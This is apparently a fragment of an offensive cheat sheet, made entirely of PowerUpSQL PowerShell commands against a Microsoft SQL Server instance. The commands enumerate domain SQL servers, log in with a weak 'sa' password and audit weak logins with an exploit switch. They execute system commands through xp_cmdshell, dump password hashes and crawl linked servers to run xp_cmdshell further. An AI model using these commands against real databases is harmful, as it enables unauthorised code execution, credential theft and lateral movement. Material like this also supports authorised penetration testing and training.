```
Get-SQLInstanceDomain -Verbose
Get-SQLServerInfo -Verbose -Instance DESKTOP-4D21EQP\SQLEXPRESS
Get-SQLInstanceLocal -Instance "DESKTOP-4D21EQP\SQLEXPRESS" | Get-SQLServerInfo
Get-SQLInstanceLocal -Instance "DESKTOP-4D21EQP\SQLEXPRESS" -username 'sa' -password '123456' | Get-SQLServerInfo
```
### Follow Out
```
$Servers = Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose -Threads 10
Invoke-SQLAuditWeakLoginPw –Verbose
Invoke-SQLAuditWeakLoginPw –Verbose –Instance DESKTOP-4D21EQP\SQLEXPRESS –Exploit
invoke-SQLOSCmd -Verbose -Instance DESKTOP-4D21EQP\SQLEXPRESS -Command "dir c:\windows\system32\Drivers\etc" -RawResults
invoke-SQLOSCmd -Verbose -Instance DESKTOP-4D21EQP\SQLEXPRESS -Command "ipconfig" -RawResults
Invoke-SQLOSCmd –Verbose –Command “whoami” –Threads 10 -Instance DESKTOP-4D21EQP\SQLEXPRESS
Get-SQLServerPasswordHash -Verbose -Instance DESKTOP-4D21EQP\SQLEXPRESS -Migrate
```

### Linked Server Crawling
```
Get-SQLServerLinkCrawl -verbose -instance "DESKTOP-4D21EQP\SQLEXPRESS" -username 'sa' -password '123456'
Get-SQLServerLinkCrawl -instance "DESKTOP-4D21EQP\SQLEXPRESS" -Query "exec master..xp_cmdshell ‘whoami’" -username 'sa' -password '123456'
Get-SQLServerLinkCrawl -instance "DESKTOP-4D21EQP\SQLEXPRESS" -Query "exec master..xp_cmdshell ‘whoami’" -username 'sa' -password '123456'
```
